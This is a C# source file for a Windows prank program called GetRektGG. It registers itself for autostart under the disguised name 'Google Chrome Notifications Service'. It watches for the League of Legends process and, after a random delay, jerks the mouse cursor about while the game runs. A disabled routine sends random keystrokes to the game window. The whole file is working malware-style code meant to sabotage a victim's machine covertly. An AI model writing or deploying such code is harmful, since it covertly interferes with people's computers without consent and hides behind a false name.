using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing;
using Microsoft.Win32;
using System.Linq;

#pragma warning disable CS0618 // Type or member is obsolete

namespace GetRektGG
{
    class Program
    {
        static bool isGameRunning = false;
        static char[] c = { 'd', 'f', 'r', 'q', 'w', 'e' };

        public static Random rand = new Random();

        public static bool isProcessRunning(string name)
        {
            foreach (Process i in Process.GetProcesses())
            {
                if (i.ProcessName == name)
                    return true;
            }
            return false;
        }

        static private void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            bool isAlready = false;
            string name = "Google Chrome Notifications Service";
            foreach (string i in rk.GetValueNames())
            {
                if (i == name && rk.GetValue(name).ToString() == Application.ExecutablePath.ToString())
                {
                    isAlready = true;
                }
            }

            if (!isAlready)
                rk.SetValue(name, Application.ExecutablePath.ToString());
        }

        static void Main(string[] args)
        {
            SetStartup();

            Thread thread_client = new Thread(new ThreadStart(checkClient));
            thread_client.Start();

            Thread thread_troll_mouse = new Thread(new ThreadStart(troll_mouse));
            thread_troll_mouse.Start();

            //Thread thread_troll_keyboard = new Thread(new ThreadStart(troll_keyboard));
            //thread_troll_keyboard.Start();
        }

        public static void checkClient()
        {
            while (true)
            {

                if (isProcessRunning("League of Legends"))
                {
                    isGameRunning = true;
                }
                else
                {
                    isGameRunning = false;
                }

                Thread.Sleep(5000);
            }
        }

        public static void troll_mouse()
        {
            while (true)
            {
                if (!isGameRunning)
                {
                    Thread.Sleep(2000);
                    continue;
                }
                int random_time = rand.Next(3, 15);
                Thread.Sleep(60 * 1000 * random_time);

                while (isGameRunning)
                {
                    Cursor.Position = new Point(Cursor.Position.X + rand.Next(0, 50) - 25, Cursor.Position.Y + rand.Next(0, 50) - 25);
                    Thread.Sleep(rand.Next(10, 150));
                }
            }
        }

        [DllImport("user32.dll")]
        static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        public static void troll_keyboard()
        {
            while (true)
            {
                if (!isGameRunning)
                {
                    Console.WriteLine("Troll_keyboard: game is NOT running, sleep for 2000 ms then continue");
                    Thread.Sleep(2000);
                    continue;
                }
                int random_time = 0; //rand.Next(3, 15);
                Console.WriteLine("Troll_keyboard: Game DETECTED and RUNNING, thread sleeping for {0} minutes", random_time);
                Thread.Sleep(60 * 1000 * random_time);

                const int WM_CHAR = 0x0102;
                Process[] p = Process.GetProcessesByName("League of Legends");
                if (p.Count() == 0)
                    return;

                while (isGameRunning)
                {
                    PostMessage(p[0].MainWindowHandle, WM_CHAR, c[rand.Next(0, 6)], 0);
                    Thread.Sleep(rand.Next(1000, 60 * 1000));
                }
            }
        }
    }
}
